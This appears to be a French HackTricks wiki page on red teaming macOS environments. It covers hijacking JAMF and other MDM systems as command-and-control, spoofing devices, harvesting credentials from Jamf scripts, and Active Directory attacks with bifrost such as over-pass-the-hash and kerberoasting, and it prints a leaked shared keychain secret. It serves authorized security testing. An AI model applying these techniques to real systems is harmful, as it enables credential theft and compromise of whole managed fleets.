# Red Teaming sur macOS

{{#include ../../banners/hacktricks-training.md}}


## Abus des MDM

- JAMF Pro : `jamf checkJSSConnection`
- Kandji

Si vous parvenez à **compromettre des identifiants d’administrateur** pour accéder à la plateforme de gestion, vous pouvez **potentiellement compromettre tous les ordinateurs** en distribuant votre malware sur les machines.

Pour faire du Red Teaming dans des environnements MacOS, il est fortement recommandé de comprendre le fonctionnement des MDM :


{{#ref}}
macos-mdm/
{{#endref}}

### Utiliser un MDM comme C2

Un MDM peut installer, interroger ou supprimer des profils, installer des applications, créer des comptes d’administrateur locaux, définir un mot de passe de firmware, modifier la clé FileVault...

Pour exploiter votre propre MDM, vous devez **faire signer votre CSR par un fournisseur** ; vous pouvez tenter de l’obtenir via [**https://mdmcert.download/**](https://mdmcert.download/). Pour exploiter votre propre MDM sur des appareils Apple, vous pouvez utiliser [**MicroMDM**](https://github.com/micromdm/micromdm).

L’inscription à un MDM ne rend **pas** automatiquement le certificat TLS du serveur de gestion fiable en tant qu’autorité de certification et ne confère pas d’identité de signature d’app. Si le serveur utilise une autorité de certification privée, ses certificats racine et intermédiaires doivent être fournis dans le profil d’inscription ou dans un profil de confiance distinct. Le certificat d’identité client utilisé pour l’authentification MDM est différent.<sup>[[7]](#references)</sup>

Un profil d’inscription MDM téléchargé (`.mobileconfig`) doit être ouvert et approuvé dans **Réglages Système → Général → Gestion de l’appareil**. Le simple fait de le placer dans un `.pkg` installé en tant que root ou dans un ZIP ouvert avec Safari n’inscrit pas silencieusement un Mac récent. Voir [comportement des profils de configuration](../macos-auto-start-locations.md#configuration-profiles-mobileconfig).<sup>[[8]](#references)</sup>

L’inscription automatisée des appareils pendant l’Assistant réglages est un processus distinct. Voir [inscription frauduleuse de l’appareil d’une autre organisation](macos-mdm/enrolling-devices-in-other-organisations.md) pour connaître ses prérequis spécifiques.<sup>[[9]](#references)</sup>

**L’agent Mythic Orthrus** utilise cette technique.

### Déployer un package via un MDM contrôlé

Sur un **Mac supervisé sous macOS 26 ou ultérieur**, le contrôle du service MDM permet d’utiliser une déclaration `com.apple.configuration.package` dans le scope système.<sup>[[10]](#references)</sup> Le package doit avoir une signature que l’appareil peut vérifier, mais son app n’a pas besoin d’une signature Developer ID distincte : Gatekeeper ne vérifie pas les apps installées par la gestion des appareils.<sup>[[11]](#references)</sup> Un certificat TLS de serveur de confiance ne donne pas à lui seul à l’opérateur la clé privée ni les droits de signature requis pour cette signature de package.<sup>[[11]](#references)[[12]](#references)</sup>

Créez un package de test signé, calculez son condensat et publiez le package ainsi qu’un plist `ManifestURL` via HTTPS. Le manifeste doit contenir un élément `software-package` avec son URL et son SHA-256, ainsi qu’un `bundle-identifier` et un `bundle-version` uniques.<sup>[[11]](#references)</sup> Envoyez ensuite une déclaration de package avec l’URL du manifeste et `InstallBehavior.Install` défini sur `Required` ; vérifiez l’élément d’état `package.list` pour confirmer l’installation ou repérer les erreurs.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
pkgbuild --component ./Test.app --install-location /Applications --sign "Package Signing Certificate" ./Test.pkg
shasum -a 256 ./Test.pkg
```

Une déclaration minimale d’installation obligatoire, soumise via le service MDM, ressemble à ceci (remplacez l’URL et les deux UUID).<sup>[[10]](#references)</sup>

```json
{
  "Type": "com.apple.configuration.package",
  "Identifier": "11111111-1111-4111-8111-111111111111",
  "ServerToken": "22222222-2222-4222-8222-222222222222",
  "Payload": {
    "ManifestURL": "https://mdm.example.org/TestPackage.plist",
    "InstallBehavior": {"Install": "Required"}
  }
}
```

### Abus de JAMF PRO

JAMF peut exécuter des **scripts personnalisés** (scripts développés par l’administrateur système), des **payloads natifs** (création de comptes locaux, définition du mot de passe EFI, surveillance des fichiers/processus...) et du **MDM** (configurations des appareils, certificats des appareils...).<sup>[[5]](#references)</sup>

#### Auto-inscription JAMF

Accédez à une page telle que `https://<company-name>.jamfcloud.com/enroll/` pour vérifier si l’**auto-inscription est activée**. Si c’est le cas, la page peut **demander des identifiants pour y accéder**.

Vous pouvez utiliser le script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) pour effectuer une password spraying attack.

De plus, après avoir trouvé des identifiants valides, vous pourriez être en mesure de brute-force d’autres noms d’utilisateur à l’aide du formulaire suivant :

![Abus de JAMF PRO - Auto-inscription JAMF : de plus, après avoir trouvé des identifiants valides, vous pourriez être en mesure de brute-force d’autres noms d’utilisateur à l’aide du formulaire suivant](<../../images/image (107).png>)

#### Authentification des appareils JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Le binaire **`jamf`** contenait le secret permettant d’ouvrir le trousseau. Au moment de sa découverte, ce secret était **partagé** par tout le monde et était : **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
De plus, jamf **persiste** sous la forme d’un **LaunchDaemon** dans **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Prise de contrôle d’un appareil JAMF

L’**URL** du **JSS** (Jamf Software Server) utilisée par **`jamf`** se trouve dans **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Ce fichier contient essentiellement l’URL :

```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
	<key>is_virtual_machine</key>
	<false/>
	<key>jss_url</key>
	<string>https://subdomain-company.jamfcloud.com/</string>
	<key>last_management_framework_change_id</key>
	<integer>4</integer>
[...]
```

Ainsi, un attaquant pourrait déposer un paquet malveillant (`pkg`) qui **écrase ce fichier** lors de son installation, en définissant **l’URL d’un listener C2 Mythic provenant d’un agent Typhon**, afin de pouvoir désormais abuser de JAMF comme C2.

```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```

#### JAMF Impersonation

Pour **usurper la communication** entre un appareil et JMF, vous avez besoin de :

- L’**UUID** de l’appareil : `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- Le **trousseau JAMF** situé dans : `/Library/Application\ Support/Jamf/JAMF.keychain`, qui contient le certificat de l’appareil

Avec ces informations, **créez une VM** avec l’**UUID** matériel **volé** et avec **SIP désactivé**, déposez le **trousseau JAMF**, **hookez** l’**agent** Jamf et volez ses informations.

#### Vol de secrets

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Vous pouvez également surveiller l’emplacement `/Library/Application Support/Jamf/tmp/` pour repérer les **scripts personnalisés** que les administrateurs pourraient vouloir exécuter via Jamf : ils sont **déposés ici, exécutés puis supprimés**. Ces scripts **peuvent contenir des identifiants**.

Cependant, des **identifiants** peuvent être transmis à ces scripts en tant que **paramètres**. Vous devrez donc surveiller `ps aux | grep -i jamf` (sans même être root).

Le script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) peut écouter l’ajout de nouveaux fichiers et de nouveaux arguments de processus.

### Accès à distance macOS

Et aussi les **protocoles** réseau « spéciaux » de **MacOS** :


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Il arrive que vous trouviez un **ordinateur MacOS connecté à un AD**. Dans ce scénario, essayez d’**énumérer** Active Directory comme vous en avez l’habitude. Vous trouverez de l’**aide** dans les pages suivantes :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Un **outil MacOS local** qui peut également vous aider est `dscl` :

```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```

Il existe également des outils conçus pour MacOS afin d’énumérer automatiquement l’AD et d’interagir avec Kerberos :

- [**Machound**](https://github.com/XMCyber/MacHound) : MacHound est une extension de l’outil d’audit Bloodhound qui permet de collecter et d’ingérer les relations Active Directory sur les hôtes MacOS.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost) : Bifrost est un projet Objective-C conçu pour interagir avec les API krb5 de Heimdal sur macOS. L’objectif du projet est de faciliter les tests de sécurité liés à Kerberos sur les appareils macOS en utilisant les API natives, sans nécessiter d’autres frameworks ou packages sur la cible.
- [**Orchard**](https://github.com/its-a-feature/Orchard) : outil JavaScript for Automation (JXA) permettant d’énumérer Active Directory.

### Informations sur le domaine

```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```

### Utilisateurs

Il existe trois types d’utilisateurs MacOS :

- **Utilisateurs locaux** — Gérés par le service local OpenDirectory, ils ne sont d’aucune façon connectés à Active Directory.
- **Utilisateurs réseau** — Utilisateurs Active Directory volatils qui doivent être connectés au serveur DC pour s’authentifier.
- **Utilisateurs mobiles** — Utilisateurs Active Directory disposant d’une sauvegarde locale de leurs identifiants et de leurs fichiers.

Les informations locales sur les utilisateurs et les groupes sont stockées dans le dossier _/var/db/dslocal/nodes/Default._\
Par exemple, les informations sur l’utilisateur appelé _mark_ sont stockées dans _/var/db/dslocal/nodes/Default/users/mark.plist_ et celles sur le groupe _admin_ dans _/var/db/dslocal/nodes/Default/groups/admin.plist_.

En plus des edges HasSession et AdminTo, **MacHound ajoute trois nouveaux edges** à la base de données Bloodhound :<sup>[[2]](#references)</sup>

- **CanSSH** - entité autorisée à se connecter en SSH à l’hôte
- **CanVNC** - entité autorisée à se connecter en VNC à l’hôte
- **CanAE** - entité autorisée à exécuter des scripts AppleEvent sur l’hôte

```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```

Plus d’informations dans [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Mot de passe de Computer$

Obtenez des mots de passe à l’aide de :

```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```

Il est possible d’accéder au mot de passe **`Computer$`** dans le trousseau de clés système.

### Over-Pass-The-Hash

Obtenir un TGT pour un utilisateur et un service spécifiques :

```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
       --hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```

Une fois le TGT récupéré, il est possible de l’injecter dans la session actuelle avec :

```bash
bifrost --action asktgt --username test_lab_admin \
       --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
       --enctype aes256 --domain test.lab.local
```

### Kerberoasting

```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
       --username [user] --hash [hash] --enctype [enctype]
```

Avec les tickets de service obtenus, il est possible d’essayer d’accéder aux partages d’autres ordinateurs :

```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```

## Accès au Keychain

Le Keychain contient très probablement des informations sensibles qui, si elles sont consultées sans générer d’invite, pourraient aider à faire avancer un exercice de red team :


{{#ref}}
macos-keychain.md
{{#endref}}

## Services externes

Le Red Teaming sur MacOS diffère du Red Teaming classique sur Windows, car **MacOS est généralement intégré directement à plusieurs plateformes externes**. Une configuration courante de MacOS consiste à accéder à l’ordinateur avec des **identifiants synchronisés par OneLogin et à accéder à plusieurs services externes** (comme github, aws...) via OneLogin.

## Techniques diverses de Red Team

### Safari

Lorsqu’un fichier est téléchargé dans Safari, s’il s’agit d’un fichier « sûr », il sera **automatiquement ouvert**. Par exemple, si vous **téléchargez un fichier zip**, il sera automatiquement décompressé :<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>



## References

- [1] [Cueillette de pommes : Red Teaming des environnements MacOS en 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Présentation de MacHound : une solution aux attaques basées sur Active Directory sur macOS](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Commandes d’énumération de domaine (équivalents de dscl / net / ldapsearch)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Rejoignez le côté obscur, nous avons des pommes : rendre malveillante la gestion de macOS](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0 : « Le point de vue d’un attaquant sur les configurations Jamf » - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Découverte d’Active Directory avec un Mac - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
- [7] [Apple — Gestion des certificats pour les services et appareils de gestion des appareils](https://developer.apple.com/documentation/devicemanagement/managing-certificates-for-device-management-services-and-devices)
- [8] [Apple — Utiliser des profils de configuration sur Mac](https://support.apple.com/en-gb/guide/mac-help/mh35561/mac)
- [9] [Apple — Déploiement de profils d’inscription à la gestion des appareils](https://developer.apple.com/documentation/devicemanagement/deploying-device-management-enrollment-profiles)
- [10] [Apple — Déclaration de package](https://developer.apple.com/documentation/devicemanagement/package)
- [11] [Apple — Installation de packages](https://developer.apple.com/documentation/devicemanagement/installing-packages)
- [12] [Apple — Identités](https://developer.apple.com/documentation/security/identities)
{{#include ../../banners/hacktricks-training.md}}
